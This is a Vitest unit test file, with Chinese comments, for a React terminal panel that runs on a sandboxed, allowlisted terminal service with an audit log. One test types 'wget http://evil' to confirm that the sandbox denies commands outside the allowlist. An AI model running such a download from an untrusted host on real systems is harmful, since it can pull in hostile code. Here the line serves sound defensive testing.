/**
 * @file: TerminalPanel.test.tsx
 * @description: 终端面板单测 — REPL 接线/策略拒绝/退出码呈现（xterm 以 mock 替身）
 * @author: YanYuCloudCube Team <admin@0379.email>
 * @version: v1.0.0
 * @created: 2026-08-20
 * @updated: 2026-08-20
 * @status: active
 * @tags: [test],[terminal],[panel],[sandbox]
 */

import { describe, it, expect, vi, beforeEach } from "vitest";
import { render, act } from "@testing-library/react";

// xterm 在 jsdom 下无法完成字体测量，mock 只验证接线；
// 导出 getLastTerminal() 供断言 write 调用，emitData() 模拟键盘输入
vi.mock("@xterm/xterm", () => {
  let instance: {
    write: ReturnType<typeof vi.fn>;
    writeln: ReturnType<typeof vi.fn>;
    clear: ReturnType<typeof vi.fn>;
    onData: ReturnType<typeof vi.fn>;
  } | null = null;
  return {
    Terminal: vi.fn().mockImplementation(() => {
      instance = {
        write: vi.fn(),
        writeln: vi.fn(),
        clear: vi.fn(),
        onData: vi.fn((cb: (d: string) => void) => {
          // 保留回调供 emitData 触发
          (instance as unknown as { __cb?: (d: string) => void }).__cb = cb;
        }),
      };
      return {
        ...instance,
        open: vi.fn(),
        focus: vi.fn(),
        onResize: vi.fn(),
        onTitleChange: vi.fn(),
        dispose: vi.fn(),
        loadAddon: vi.fn(),
        unicode: { activeVersion: "11" },
        cols: 80,
        rows: 24,
      };
    }),
    emitData: (d: string) => {
      const holder = instance as unknown as { __cb?: (d: string) => void } | null;
      holder?.__cb?.(d);
    },
    getLastTerminal: () => instance,
  };
});
vi.mock("@xterm/addon-fit", () => ({ FitAddon: vi.fn().mockImplementation(() => ({ fit: vi.fn() })) }));
vi.mock("@xterm/addon-web-links", () => ({ WebLinksAddon: vi.fn().mockImplementation(() => ({})) }));
vi.mock("@xterm/addon-search", () => ({ SearchAddon: vi.fn().mockImplementation(() => ({})) }));
vi.mock("@xterm/addon-unicode11", () => ({ Unicode11Addon: vi.fn().mockImplementation(() => ({})) }));

import TerminalPanel from "../TerminalPanel";
import * as XTermModule from "@xterm/xterm";

// 测试专用导出仅存在于上方 mock（真实模块没有），经 cast 取用
const { emitData, getLastTerminal } = XTermModule as unknown as {
  emitData: (d: string) => void;
  getLastTerminal: () => {
    write: ReturnType<typeof vi.fn>;
    writeln: ReturnType<typeof vi.fn>;
    clear: ReturnType<typeof vi.fn>;
    onData: ReturnType<typeof vi.fn>;
  } | null;
};
import {
  SandboxPolicy,
  TerminalService,
  type SandboxPolicy as PolicyForAccess,
} from "../../../services/terminal";
import { DryRunProvider } from "../../../services/terminal/providers/DryRunProvider";

function makeService() {
  const policy = new SandboxPolicy({
    allowedCommands: ["echo", "false", "clear"],
    session: { maxCommands: 10, windowMs: 60_000 },
    defaultTimeoutMs: 100,
    maxTimeoutMs: 500,
  });
  const service = new TerminalService({ policy, defaultProvider: "dry-run" });
  service.registerProvider(new DryRunProvider());
  return { service, policy };
}

/** 已渲染终端的累计 write 输出 */
function allWrites(): string {
  const term = getLastTerminal();
  return term ? term.write.mock.calls.flat().join("") : "";
}

/** 模拟用户键入一整行并回车，等待命令回路完成 */
async function typeLine(line: string) {
  for (const ch of line) act(() => emitData(ch));
  act(() => emitData("\r"));
  await act(async () => {
    await new Promise((r) => setTimeout(r, 30));
  });
}

beforeEach(() => {
  vi.clearAllMocks();
});

describe("TerminalPanel", () => {
  it("渲染面板标题与会话标识", () => {
    const { service } = makeService();
    render(<TerminalPanel nodeId="n1" sessionKey="t1" service={service} />);
    expect(document.querySelector("[data-panel-id='terminal']")).not.toBeNull();
    expect(document.body.textContent).toContain("session: t1");
  });

  it("echo 命令经沙箱执行回显输出（DryRun）并审计 executed", async () => {
    const { service, policy } = makeService();
    render(<TerminalPanel nodeId="n1" sessionKey="t2" service={service} />);
    await typeLine("echo 你好沙箱");

    expect(allWrites()).toContain("你好沙箱");
    expect(policy.getAuditLog()[0]).toMatchObject({ outcome: "executed", provider: "dry-run" });
  });

  it("白名单外命令在面板内呈现拒绝信息（不抛出）并审计 denied", async () => {
    const { service, policy } = makeService();
    render(<TerminalPanel nodeId="n1" sessionKey="t3" service={service} />);
    await typeLine("wget http://evil");

    expect(allWrites()).toContain("命令被拒绝");
    expect(policy.getAuditLog()[0].outcome).toBe("denied");
  });

  it("false 命令呈现非零退出码并审计 exec-failed", async () => {
    const { service, policy } = makeService();
    render(<TerminalPanel nodeId="n1" sessionKey="t4" service={service} />);
    await typeLine("false");

    expect(allWrites()).toContain("exit 1");
    expect(policy.getAuditLog()[0].outcome).toBe("exec-failed");
  });

  it("clear 命令清屏重绘提示符", async () => {
    const { service } = makeService();
    render(<TerminalPanel nodeId="n1" sessionKey="t5" service={service} />);
    await typeLine("clear");

    expect(getLastTerminal()?.clear).toHaveBeenCalled();
    expect(allWrites()).toContain("yyc3 ❯");
  });

  it("Ctrl+C 清空当前输入不触发执行", async () => {
    const { service, policy } = makeService();
    render(<TerminalPanel nodeId="n1" sessionKey="t6" service={service} />);
    for (const ch of "ech") act(() => emitData(ch));
    act(() => emitData("\u0003"));

    expect(allWrites()).toContain("^C");
    expect(policy.getAuditLog()).toHaveLength(0);
  });
});
